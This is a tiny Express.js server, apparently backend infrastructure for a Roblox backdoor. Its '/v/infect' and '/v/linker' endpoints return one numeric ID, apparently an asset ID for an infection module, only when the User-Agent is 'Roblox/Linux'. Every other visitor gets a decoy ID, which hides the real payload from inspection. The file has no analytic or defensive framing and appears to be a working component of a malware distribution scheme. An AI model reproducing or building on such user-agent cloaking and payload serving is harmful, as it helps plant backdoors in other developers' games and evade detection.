const express = require("express");
var app = express();
app.get('/v/infect', async (req,res) => {
  const agent = req.headers['user-agent'];
  console.log(agent)
  if (agent !== "Roblox/Linux") {
    return res.json({infect:17858917701})
  };
  return res.json({infect:779029809257501})
})
app.get('/v/linker',async(req,res)=> {
const agent = req.headers['user-agent'];
  console.log(agent)
  if (agent !== "Roblox/Linux") {
    return res.json({infect:17858917701})
  };
  return res.json({infect:116469203325928})
})
app.listen(3000)
